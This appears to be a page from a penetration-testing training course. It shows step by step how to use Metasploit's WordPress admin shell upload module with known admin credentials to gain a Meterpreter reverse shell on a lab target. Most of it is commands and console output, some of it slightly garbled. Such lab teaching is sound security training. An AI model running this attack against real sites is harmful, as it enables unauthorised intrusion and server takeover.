
<h1>Attacking WordPress with Metasploit</h1>
<hr/>
<h2>Automating WordPress Exploitation</h2>
<p>We can use the  <span class="text-success" data-title="Metasploit Framework is an open-source tool for developing and executing exploit code against remote target machines." data-toggle="tooltip">Metasploit Framework (MSF)</span> to obtain a reverse shell on the target automatically. This requires valid credentials for an account that has sufficient rights to create files on the webserver.</p>
<p>We can quickly start <code>MSF</code> by issuing the following command:</p>
<h4>Starting Metasploit Framework</h4>
<pre><code class="language-shell-session">[!bash!]$ msfconsole
</code></pre>
<hr/>
<p>To obtain the reverse shell, we can use the <code>wp_admin_shell_upload</code> module. We can easily search for it inside <code>MSF</code>:</p>
<h4>MSF Search</h4>
<pre><code class="language-shell-session">msf5 &gt; search wp_admin

Matching Modules
================

#  Name                                       Disclosure Date  Rank       Check  Description
-  ----                                       ---------------  ----       -----  -----------
0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
</code></pre>
<p>The number <code>0</code> in the search results represents the ID for the suggested modules. From here on, we can specify the module by its ID number to save time.</p>
<h4>Module Selection</h4>
<pre><code class="language-shell-session">msf5 &gt; use 0

msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt;
</code></pre>
<hr/>
<h4>Module Options</h4>
<p>Each module offers different settings options that we can use to assign precise specifications to <code>MSF</code> to ensure the attack's success. We can list these options by issuing the following command:</p>
<h4>List Options</h4>
<pre><code class="language-shell-session">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

Name       Current Setting  Required  Description
----       ---------------  --------  -----------
PASSWORD                    yes       The WordPress password to authenticate with
Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
RPORT      80               yes       The target port (TCP)
SSL        false            no        Negotiate SSL/TLS for outgoing connections
TARGETURI  /                yes       The base path to the wordpress application
USERNAME                    yes       The WordPress username to authenticate with
VHOST                       no        HTTP server virtual host


Exploit target:

Id  Name
--  ----
0   WordPress
</code></pre>
<hr/>
<h2>Exploitation</h2>
<p>After using the <code>set</code> command to make the necessary modifications, we can use the <code>run</code> command to execute the module. If all of our parameters are set correctly, it will spawn a reverse shell on the target upon execution.</p>
<h4>Set Options</h4>
<pre><code class="language-shell-session">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set rhosts blog.inlanefreight.com
msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set username admin
msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set password Winter2020
msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set lhost 10.10.16.8
msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; run

[*] Started reverse TCP handler on 10.10.16.8z4444
[*] Authenticating with WordPress using admin:Winter202@...
[+] Authenticated with WordPress
[*] Uploading payload...
[*] Executing the payload at /wp—content/plugins/YtyZGFIhax/uTvAAKrAdp.php...
[*] Sending stage (38247 bytes) to blog.inlanefreight.com
[*] Meterpreter session 1 opened
[+] Deleted uTvAAKrAdp.php

meterpreter &gt; getuid
Server username: www—data (33)
</code></pre>
